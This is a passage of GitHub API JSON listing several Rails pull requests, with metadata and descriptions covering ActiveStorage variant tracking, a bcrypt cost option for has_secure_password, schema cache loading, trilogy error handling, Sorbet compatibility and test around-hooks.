            "received_events_url": "https://api.github.com/users/JaceBayless/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-27T04:41:38Z",
        "updated_at": "2024-01-27T04:42:19Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50895",
            "html_url": "https://github.com/rails/rails/pull/50895",
            "diff_url": "https://github.com/rails/rails/pull/50895.diff",
            "patch_url": "https://github.com/rails/rails/pull/50895.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\n#### My Specific Use Case\r\n\r\nIn my project, where `ActiveStorage.track_variants = true`, I needed to generate a variant of an image (a thumbnail for a room on a floorplan) but did not want to create a variant record of the original image record. This is because I intended to save the variant on a child relation, separate from the original image record.\r\n\r\n#### The Challenge\r\nWith `ActiveStorage.track_variants = true` every variant generated through `ActiveStorage` is automatically tracked in the database to the original record. There are cases in this application where we **do** want to track these variant records so I was unable to change the default configuration. This meant to properly generate my variant I had to use `ImageProcessing::Vips` directly to not generate the variant record. This worked but generated two concerns for me:\r\n\r\n1. This specific code is dependent on `ImageProcessing::Vips` and if we were to ever migrate to another image processor we would have to remember to update this code as well instead of just relying on the `ActiveStorage` default processor.\r\n2. It strays enough from the standard pattern when generating `ActiveStorage` variants that without good documentation it can become confusing to maintain.\r\n\r\n### Detail\r\n\r\nThis pull request adds the `track` option to the `variant` method which allows for overriding of the `ActiveStorage.track_variants`. This is useful when in cases where you want to stray from the application's standard configuration.\r\n\r\n```ruby\r\nActiveSupport.track_variants\r\n# => true\r\nuser.avatar.variant(track: false, resize_to_limit: [100, 100])\r\n# => #<ActiveStorage::Variant:0x00007f4e0004ffb0> \r\n```\r\nand\r\n```ruby\r\nActiveSupport.track_variants\r\n# => false\r\nuser.avatar.variant(track: true, resize_to_limit: [100, 100])\r\n# => #<ActiveStorage::VariantWithRecord:0x00007f4e0004ffb0> \r\n```\r\n\r\n### Additional information\r\n\r\nThis is my first time contributing to Rails and I appreciate anyone who takes the time to read all this. I tried my best to follow all conventions and to keep all current functionality, but in the case that I missed something I'd be happy to discuss and fix whatever is needed.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50895/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50895/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50894",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50894/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50894/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50894/events",
        "html_url": "https://github.com/rails/rails/pull/50894",
        "id": 2103022783,
        "node_id": "PR_kwDNIULOZTPMhg",
        "number": 50894,
        "title": "Add cost argument to has_secure_password",
        "user": {
            "login": "t27duck",
            "id": 545604,
            "node_id": "MDQ6VXNlcjU0NTYwNA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/545604?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/t27duck",
            "html_url": "https://github.com/t27duck",
            "followers_url": "https://api.github.com/users/t27duck/followers",
            "following_url": "https://api.github.com/users/t27duck/following{/other_user}",
            "gists_url": "https://api.github.com/users/t27duck/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/t27duck/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/t27duck/subscriptions",
            "organizations_url": "https://api.github.com/users/t27duck/orgs",
            "repos_url": "https://api.github.com/users/t27duck/repos",
            "events_url": "https://api.github.com/users/t27duck/events{/privacy}",
            "received_events_url": "https://api.github.com/users/t27duck/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-26T22:52:13Z",
        "updated_at": "2024-02-13T22:59:53Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50894",
            "html_url": "https://github.com/rails/rails/pull/50894",
            "diff_url": "https://github.com/rails/rails/pull/50894.diff",
            "patch_url": "https://github.com/rails/rails/pull/50894.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThere may be instances where a developer is working in an environment where a higher cost than the default (12) for BCrypt is required either due to arbitrary security requirements or the recommended minimum changes and the version of bcrypt used isn't updated.\r\n\r\n### Detail\r\n\r\nThis change adds a `cost:` argument to `has_secure_password`. If provided, it will use that value for the password cost. Its value is validated to make sure it's between `BCrypt::Engine::MIN_COST` and `BCrypt::Engine::MAX_COST`.\r\n\r\nAdditionally `[password attribute]_cost` is exposed as a convenience method to determine the cost used for the set password hash. This can be used to review the current costs from a user record and either transparently upgrade the user's password or force a password reset.\r\n\r\n### Additional information\r\n\r\nI'm not 100% married to using `cost` as the argument name as it affects only new passwords created for the record going forward.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50894/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50894/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50893",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50893/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50893/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50893/events",
        "html_url": "https://github.com/rails/rails/pull/50893",
        "id": 2102991313,
        "node_id": "PR_kwDNIULOZTNcEQ",
        "number": 50893,
        "title": " Unify the logic to determine the default schema cache path for a database configuration",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-26T22:26:39Z",
        "updated_at": "2024-02-09T23:29:24Z",
        "closed_at": "2024-01-29T18:36:47Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50893",
            "html_url": "https://github.com/rails/rails/pull/50893",
            "diff_url": "https://github.com/rails/rails/pull/50893.diff",
            "patch_url": "https://github.com/rails/rails/pull/50893.patch",
            "merged_at": "2024-01-29T18:36:47Z"
        },
        "body": "When the application has more than one database configuration, only the primary was being loaded by default on boot time. All the other connection pools were loading the schema cache lazily.\r\n\r\nThis logic can be found in:\r\n\r\nhttps://github.com/rails/rails/blob/351a8d9bc99e69cc8d1ced86dc1d523e2dc51985/activerecord/lib/active_record/connection_adapters/pool_config.rb#L13\r\nhttps://github.com/rails/rails/blob/351a8d9bc99e69cc8d1ced86dc1d523e2dc51985/activerecord/lib/active_record/railtie.rb#L149-L178\r\n\r\nThe lazy code path wasn't using the same logic to determine the name of the default schema cache file that the Railties uses, so it was loading the schema cache of the primary config to all the other configs. If no table name coincided nothing bad would happen, but if table names coincided, the schema would be completely wrong in all non-primary connections.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50893/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50893/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50892",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50892/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50892/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50892/events",
        "html_url": "https://github.com/rails/rails/pull/50892",
        "id": 2102819884,
        "node_id": "PR_kwDNIULOZTEC2A",
        "number": 50892,
        "title": "Documentation: Expand documentation on has_one_attached method [ci-skip].",
        "user": {
            "login": "Takahashi-Seiji",
            "id": 140453075,
            "node_id": "U_kgDOCF8k0w",
            "avatar_url": "https://avatars.githubusercontent.com/u/140453075?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Takahashi-Seiji",
            "html_url": "https://github.com/Takahashi-Seiji",
            "followers_url": "https://api.github.com/users/Takahashi-Seiji/followers",
            "following_url": "https://api.github.com/users/Takahashi-Seiji/following{/other_user}",
            "gists_url": "https://api.github.com/users/Takahashi-Seiji/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Takahashi-Seiji/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Takahashi-Seiji/subscriptions",
            "organizations_url": "https://api.github.com/users/Takahashi-Seiji/orgs",
            "repos_url": "https://api.github.com/users/Takahashi-Seiji/repos",
            "events_url": "https://api.github.com/users/Takahashi-Seiji/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Takahashi-Seiji/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-26T20:02:30Z",
        "updated_at": "2024-02-09T21:15:30Z",
        "closed_at": "2024-02-09T21:14:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50892",
            "html_url": "https://github.com/rails/rails/pull/50892",
            "diff_url": "https://github.com/rails/rails/pull/50892.diff",
            "patch_url": "https://github.com/rails/rails/pull/50892.patch",
            "merged_at": "2024-02-09T21:14:57Z"
        },
        "body": "### Motivation / Background\r\n\r\nGive further context about the requirements for using the has_one_attached method. \r\n\r\nI have an application that does not have an ActiveJob::Backend queue adapter. When I tried to destroy a record, it raised an error that I needed a queue adapter. There is a dependency between the has_one_attached method and a queue adapter. \r\n\r\nThat is why adding more context about the functionality and requirements about using the has_one_attached method is important. \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50892/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 2,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50892/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50891",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50891/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50891/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50891/events",
        "html_url": "https://github.com/rails/rails/pull/50891",
        "id": 2102639316,
        "node_id": "PR_kwDNIULOZS6Khw",
        "number": 50891,
        "title": "Clean up trilogy error translation",
        "user": {
            "login": "composerinteralia",
            "id": 13696143,
            "node_id": "MDQ6VXNlcjEzNjk2MTQz",
            "avatar_url": "https://avatars.githubusercontent.com/u/13696143?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/composerinteralia",
            "html_url": "https://github.com/composerinteralia",
            "followers_url": "https://api.github.com/users/composerinteralia/followers",
            "following_url": "https://api.github.com/users/composerinteralia/following{/other_user}",
            "gists_url": "https://api.github.com/users/composerinteralia/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/composerinteralia/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/composerinteralia/subscriptions",
            "organizations_url": "https://api.github.com/users/composerinteralia/orgs",
            "repos_url": "https://api.github.com/users/composerinteralia/repos",
            "events_url": "https://api.github.com/users/composerinteralia/events{/privacy}",
            "received_events_url": "https://api.github.com/users/composerinteralia/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T17:54:02Z",
        "updated_at": "2024-01-26T18:27:12Z",
        "closed_at": "2024-01-26T18:27:12Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50891",
            "html_url": "https://github.com/rails/rails/pull/50891",
            "diff_url": "https://github.com/rails/rails/pull/50891.diff",
            "patch_url": "https://github.com/rails/rails/pull/50891.patch",
            "merged_at": "2024-01-26T18:27:12Z"
        },
        "body": "This commit makes a few changes to our trilogy error translation:\r\n\r\n* https://github.com/trilogy-libraries/trilogy/pull/118 introduced `Trilogy::EOFError` which we can use instead of matching on `TRILOGY_CLOSED_CONNECTION`.\r\n* https://github.com/trilogy-libraries/trilogy/pull/15 introduced `Trilogy::ConnectionClosed`, which inherits from `IOError` for backwards compatibility. As far as I can tell that's the only `IOError` trilogy can raise, so this commit rescues the trilogy-specific error instead.\r\n* As far as I can tell Trilogy does not raise `SocketError`, so don't bother translating that\r\n* Don't treat `TRILOGY_UNEXPECTED_PACKET` as a connection error. If we get this, it's probably a bug in trilogy that we should fix. I'd like to eventually get rid of `TRILOGY_INVALID_SEQUENCE_ID` too, but we're currently relying on it in a few tests (related to trilogy missing caching_sha2_password auth support, if I recall correctly)\r\n\r\nI'm kinda hoping we'll eventually be able to simplify this to something like:\r\n\r\n```rb\r\nif exception.is_a?(Trilogy::ConnectionError)\r\n  ConnectionFailed.new(message, connection_pool: @pool)\r\nelse\r\n  super\r\nend\r\n```\r\n\r\nbut we'd need more changes to trilogy before that is possible.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50891/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50891/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50890",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50890/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50890/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50890/events",
        "html_url": "https://github.com/rails/rails/pull/50890",
        "id": 2102516625,
        "node_id": "PR_kwDNIULOZSzfwQ",
        "number": 50890,
        "title": "Make ActiveSupport DelegationError Sorbet friendly",
        "user": {
            "login": "djensenius",
            "id": 782512,
            "node_id": "MDQ6VXNlcjc4MjUxMg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/782512?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djensenius",
            "html_url": "https://github.com/djensenius",
            "followers_url": "https://api.github.com/users/djensenius/followers",
            "following_url": "https://api.github.com/users/djensenius/following{/other_user}",
            "gists_url": "https://api.github.com/users/djensenius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djensenius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djensenius/subscriptions",
            "organizations_url": "https://api.github.com/users/djensenius/orgs",
            "repos_url": "https://api.github.com/users/djensenius/repos",
            "events_url": "https://api.github.com/users/djensenius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djensenius/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T16:38:54Z",
        "updated_at": "2024-01-26T18:16:18Z",
        "closed_at": "2024-01-26T18:16:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50890",
            "html_url": "https://github.com/rails/rails/pull/50890",
            "diff_url": "https://github.com/rails/rails/pull/50890.diff",
            "patch_url": "https://github.com/rails/rails/pull/50890.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nFix ActiveSupport DelegationError to not cause issues with Sorbet.\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\n### Detail\r\n\r\n`DelegationError = ActiveSupport::DelegationError` was causing the following Sorbet error:\r\n\r\n```Error: Sorbet#4022: Cannot initialize the class `DelegationError` by constant assignment\r\nOccurred at: sorbet/rbi/gems/activesupport@7.2.0.alpha.3c3df4cea3.rbi:19441```\r\n\r\nMade the change suggested in [Sorbet error guide](https://sorbet.org/docs/error-reference#4022)\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [X] Tests are added or updated if you fix a bug or add a feature.\r\n* [X] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50890/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50890/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50889",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50889/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50889/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50889/events",
        "html_url": "https://github.com/rails/rails/pull/50889",
        "id": 2102411019,
        "node_id": "PR_kwDNIULOZStxpQ",
        "number": 50889,
        "title": "Introduce `ActiveSupport::TestCase.around`",
        "user": {
            "login": "seanpdoyle",
            "id": 2575027,
            "node_id": "MDQ6VXNlcjI1NzUwMjc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2575027?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/seanpdoyle",
            "html_url": "https://github.com/seanpdoyle",
            "followers_url": "https://api.github.com/users/seanpdoyle/followers",
            "following_url": "https://api.github.com/users/seanpdoyle/following{/other_user}",
            "gists_url": "https://api.github.com/users/seanpdoyle/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/seanpdoyle/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/seanpdoyle/subscriptions",
            "organizations_url": "https://api.github.com/users/seanpdoyle/orgs",
            "repos_url": "https://api.github.com/users/seanpdoyle/repos",
            "events_url": "https://api.github.com/users/seanpdoyle/events{/privacy}",
            "received_events_url": "https://api.github.com/users/seanpdoyle/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 12,
        "created_at": "2024-01-26T15:29:23Z",
        "updated_at": "2024-02-13T23:14:06Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50889",
            "html_url": "https://github.com/rails/rails/pull/50889",
            "diff_url": "https://github.com/rails/rails/pull/50889.diff",
            "patch_url": "https://github.com/rails/rails/pull/50889.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nWhen discussing testing frameworks for new projects, the absence of `around` hooks is usually a focal point of the conversation that pushes consensus toward alternative test harnesses.\r\n\r\nMinitest itself [will not support built-in `around` hooks](https://github.com/minitest/minitest/issues/892). While the [minitest-hooks](https://github.com/jeremyevans/minitest-hooks) gem provides support for `around`, Active Support's callback system makes adding `around` hooks fairly trivial, and is guaranteed to be implemented in the same way as all other callbacks (Controller, Jobs, Mailers, etc.).\r\n\r\n\r\n### Detail\r\n\r\nAdd a callback, which runs around `TestCase#setup`, the `test` block, and `TestCase#teardown`. Yields the test class instance and the test case to the block:\r\n\r\n```ruby\r\nclass Test < ActiveSupport::TestCase\r\n  around do |test_case, &block|\r\n    Client.with(stubbed: true, &block)\r\n  end\r\nend\r\n```\r\n\r\n### Additional Information\r\n\r\nTo support this change, rename the `activesupport/test/testing/after_teardown_test.rb` file to `activesupport/test/testing/callbacks_test.rb`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50889/reactions",
            "total_count": 4,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50889/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50888",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50888/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50888/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50888/events",
        "html_url": "https://github.com/rails/rails/pull/50888",
        "id": 2102266737,
        "node_id": "PR_kwDNIULOZSl6Rw",
        "number": 50888,
        "title": " Make DelegationError Sorbet friendly",
        "user": {
            "login": "djensenius",
            "id": 782512,
            "node_id": "MDQ6VXNlcjc4MjUxMg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/782512?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djensenius",
            "html_url": "https://github.com/djensenius",
            "followers_url": "https://api.github.com/users/djensenius/followers",
            "following_url": "https://api.github.com/users/djensenius/following{/other_user}",
            "gists_url": "https://api.github.com/users/djensenius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djensenius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djensenius/subscriptions",
            "organizations_url": "https://api.github.com/users/djensenius/orgs",
            "repos_url": "https://api.github.com/users/djensenius/repos",
            "events_url": "https://api.github.com/users/djensenius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djensenius/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-26T14:01:27Z",
        "updated_at": "2024-01-26T14:01:34Z",
